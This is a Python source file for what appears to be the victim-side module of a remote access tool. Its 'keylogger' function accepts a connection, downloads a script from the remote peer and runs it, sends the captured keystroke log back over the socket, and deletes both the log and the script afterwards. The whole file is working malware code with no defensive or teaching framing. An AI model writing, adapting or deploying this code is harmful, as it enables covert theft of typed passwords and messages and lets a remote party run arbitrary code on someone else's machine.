from termcolor import colored
import socket
import os, subprocess
import sys,time

sys.stdin = os.fdopen(sys.stdin.fileno(), 'r', buffering=1)

def keylogger(ip,port):

	sock = socket.socket()
	sock.bind(('0.0.0.0',port))

	sock.listen()
	scon, addr = sock.accept()

	file = open('script.py','wb')
	line = scon.recv(1024)

	while(line):
		if "end of file" in line.decode():
#			print ("Reached end of file")
			break
		elif "end of file" not in line.decode():
#			print (line.decode())
			file.write(line)
			line = scon.recv(1024)

	file.close()
#	print ("File received")

	interval = scon.recv(1024).decode()

	interval = interval[interval.rfind('=')+1:]
	sleeptime = interval.strip()

	print (colored(f"\nEnter something to capture keystrokes! Use another terminal to write.\n",'yellow'))
	subprocess.run(['python3','script.py',sleeptime])

#	print ("Process executed!")
#	print ("Waiting for logs:",sleeptime,"seconds")

#	wait for the log file to be generated
	time.sleep(int(2))

	fileopen = True
	try:
		file = open('keylog.txt','rb')
	except:
		print (colored(f'\nFile does not exist\n','red'))
		fileopen = False

	if fileopen == True:

		line = file.read(1024)
		while(line):
			scon.send(line)
			line = file.read(1024)

		file.close()
		os.remove('keylog.txt')
	else:
		scon.send(' '.encode())

#	print ("File transmitted!")

	os.remove('script.py')

	sock.close()
